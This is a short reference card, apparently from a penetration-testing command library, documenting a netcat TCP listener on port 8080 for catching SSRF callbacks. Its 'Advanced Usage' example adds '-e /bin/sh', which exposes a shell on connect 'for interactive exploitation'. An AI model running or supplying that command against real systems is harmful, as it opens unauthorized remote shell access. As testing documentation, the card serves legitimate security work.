---
data: nc -lvp 8080
tags:
  - listener
  - network
type: command
executor: bash
platforms:
  - Linux
  - Unix
id: 9b88bc73-6f18-4465-a364-967538e565fc
created_at: '2025-12-14T04:39:09.915Z'
updated_at: '2025-12-14T04:39:09.915Z'
verified: false
validated: true
submitted: true
---
# nc-listen

## Command

```bash
nc -lvp 8080
```

## Description

This netcat command sets up a TCP listener on port 8080 to capture incoming connections, commonly used in SSRF testing to receive server-side requests. It displays verbose output for easy analysis.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-l` | Listen mode | Yes |
| `-v` | Verbose output | Yes |
| `-p 8080` | Specify port | Yes |

## Examples

### Basic Usage

```bash
nc -lvp 8080
```

### Advanced Usage

```bash
nc -lvp 8080 -e /bin/sh
```
(Enables shell on connect, for interactive exploitation)

## Expected Output

"Listening on [0.0.0.0] (family 0, port 8080)" followed by connection details and raw data on receive.

## Related

- [[Related Procedure|procedures/Set-Up-Attacker-Listener]]
